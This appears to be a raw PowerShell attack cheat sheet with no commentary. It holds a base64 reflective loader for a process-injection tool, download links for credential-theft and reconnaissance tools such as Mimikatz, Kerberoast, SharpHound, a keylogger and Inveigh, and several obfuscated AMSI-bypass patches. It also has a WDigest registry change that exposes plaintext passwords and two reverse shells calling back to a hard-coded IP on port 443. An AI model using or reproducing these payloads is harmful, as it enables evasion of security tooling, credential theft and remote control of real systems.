$base = gc -raw .\remote.txt
$b64 = [System.Convert]::FromBase64String($base)
[System.Reflection.Assembly]::Load($b64)
[CreateRemoteThread.Program]::Main(@())
[CreateRemoteThread.Program]::Main(@(8812))

https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/create.txt
https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/nt.txt

==============================================================================================================================

https://github.com/Arno0x/DNSExfiltrator/raw/refs/heads/master/release/dnsExfiltrator.exe

https://raw.githubusercontent.com/lazywinadmin/PowerShell/refs/heads/master/TOOL-Start-KeyLogger/Start-KeyLogger.ps1

https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/key.txt

https://raw.githubusercontent.com/gangstanthony/PowerShell/refs/heads/master/Get-Clipboard.ps1

https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/clip.txt

https://gist.githubusercontent.com/0xbadjuju/0ebe02983273048c237a8b24633cee3f/raw/c385a21c230ee0e274293aa4e50b5b9ed4197df2/Invoke-Kerberoast.ps1

https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/kerb.txt

https://raw.githubusercontent.com/BloodHoundAD/BloodHound/refs/heads/master/Collectors/SharpHound.ps1

https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/blood.txt

https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/gpp.txt

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Exfiltration/Get-GPPPassword.ps1

https://github.com/vinicius-batistella/Rumo/raw/refs/heads/main/catz.txt

https://github.com/vinicius-batistella/Rumo/raw/refs/heads/main/Invoke-Mimikatz.ps1

https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/refs/heads/master/Inveigh.ps1

https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/fake.txt

==============================================================================================================================

[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

==============================================================================================================================

reg query HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential

reg add HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

==============================================================================================================================

$c = ‘t’
$Win32 = @”
using System.Runtime.InteropServices;
using System;
public class Win32 {
[DllImport(“kernel32”)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport(“kernel32”)]
public static extern IntPtr LoadLibrary(string name);
[DllImport(“kernel32”)]
public static extern bool VirtualProtec$c(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
“@
Add-Type $Win32
$nowhere = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($nowhere))
$somewhere = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$notaddress = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($somewhere))
$notp = 0
$replace = ‘VirtualProtec’
[Win32]::(‘{0}{1}’ -f $replace,$c)($notaddress, [uint32]5, 0x40, [ref]$notp)
$stopitplease = [Byte[]] (0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
$marshalClass = [System.Runtime.InteropServices.Marshal]
$marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)

==============================================================================================================================

$kizax = @"
using System;
using System.Runtime.InteropServices;
public class kizax {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr yjnqcb, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $kizax

$rykogwu = [kizax]::LoadLibrary("$(('àm'+'sî'+'.d'+'ll').noRMaLiZe([CHAr]([BYte]0x46)+[ChAr]([BYTE]0x6f)+[chAR]([BYTe]0x72)+[Char](109*8/8)+[chaR](68*31/31)) -replace [cHaR](92+76-76)+[cHaR]([byTE]0x70)+[cHar](107+16)+[chAr]([BYtE]0x4d)+[char]([BytE]0x6e)+[cHAr]([byTe]0x7d))")
$iyslea = [kizax]::GetProcAddress($rykogwu, "$(('ÃmsîScân'+'Buffer').normaliZe([ChAr]([bYTe]0x46)+[CHaR]([byte]0x6f)+[chAR]([BYTE]0x72)+[cHar]([byte]0x6d)+[chaR]([byTe]0x44)) -replace [char]([bYTe]0x5c)+[char](112*56/56)+[CHAR](123)+[CHAr](75+2)+[char](94+16)+[ChAR]([ByTE]0x7d))")
$p = 0
[kizax]::VirtualProtect($iyslea, [uint32]5, 0x40, [ref]$p)
$aapt = "0xB8"
$qkwf = "0x57"
$snxi = "0x00"
$wnan = "0x07"
$nchj = "0x80"
$yywa = "0xC3"
$estof = [Byte[]] ($aapt,$qkwf,$snxi,$wnan,+$nchj,+$yywa)
[System.Runtime.InteropServices.Marshal]::Copy($estof, 0, $iyslea, 6)

==============================================================================================================================

$teste = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('am'+'siInitFailed','NonPublic,Static')
$teste.SetValue($null,$true)

==============================================================================================================================

$x=51;$a=[Ref].Assembly;$y=$x*1000;$b=$a.GetTypes();$z=$y-32;$c=ForEach($d in $b){$y=$y-1;$z=$y;if($d.Name -like '*ils'){$z=$z-1;$x=$y+$z;if($d.Name -like '*siUt*'){$y=$y+1;$x=$y;$y=$y-1;$d;break;};};};$x=$z;$e=$c.GetFields('NonPublic,Static');$y=$x-2;$g=ForEach($f in $e){if($f.Name -like '*ext'){$z=$z-1;$x=$y+$z;if($f.Name -like '*siCo*'){$y=$y+1;$x=$y;$y=$y-1;$f;break;};};};$z=324;$h=$g.GetValue($null);$x=$y-2;[IntPtr]$i=$h;$z=$x+2;[Int32[]]$j=@(0);$y=$z;[System.Runtime.InteropServices.Marshal]::Copy($j,0,$i,1);

==============================================================================================================================

powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('52.54.121.107', 443);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"

==============================================================================================================================

$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('52.54.121.107', 443);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()

==============================================================================================================================

$x=51
$a=[Ref].Assembly
$y=$x*1000
$b=$a.GetTypes()
$z=$y-32
$c=ForEach($d in $b){$y=$y-1;$z=$y;if($d.Name -like '*ils'){$z=$z-1;$x=$y+$z;if($d.Name -like 'siUt'){$y=$y+1;$x=$y;$y=$y-1;$d;break;};};}
$x=$z
$e=$c.GetFields('NonPublic,Static')
$y=$x-2
$g=ForEach($f in $e){if($f.Name -like '*ext'){$z=$z-1;$x=$y+$z;if($f.Name -like 'siCo'){$y=$y+1;$x=$y;$y=$y-1;$f;break;};};}
$z=324
$h=$g.GetValue($null)
$x=$y-2
[IntPtr]$i=$h
$z=$x+2
[Int32[]]$j=@(0)
$y=$z
[System.Runtime.InteropServices.Marshal]::Copy($j,0,$i,1)

